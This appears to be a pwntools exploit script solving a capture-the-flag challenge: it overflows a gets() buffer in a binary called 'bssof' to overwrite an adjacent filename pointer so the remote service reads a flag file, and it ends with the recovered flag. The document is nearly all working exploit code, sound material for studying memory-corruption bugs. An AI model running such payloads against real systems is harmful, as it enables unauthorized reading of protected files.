#!/usr/bin/env python
from pwn import *

r = remote('192.168.31.25',11000)
bssof = ELF('./bssof')

# mov    DWORD PTR ds:0x804a128,0x8048733        0x804a128 == 0x8048733 -> address of ("/home/bssof/welcome") 
# ....
# call   0x8048430 <gets@plt> 			 0x804a060 == buf that get name
# mov eax,ds:0x804a128     			 
# ---------------------------------------------->use input name to cover the filename address at 0x804a128

off = bssof.symbols['filename'] - bssof.symbols['name']

flag = '/home/bssof/flag'
padding = '\x00' * (off-len(flag))

payload = flag + padding + p32(bssof.symbols['name'])

res = r. readuntil('\n')

r.send(payload)
r.interactive()


#AD{0v3Rf10w_F1l3n4m3_1s_S0_fUN}



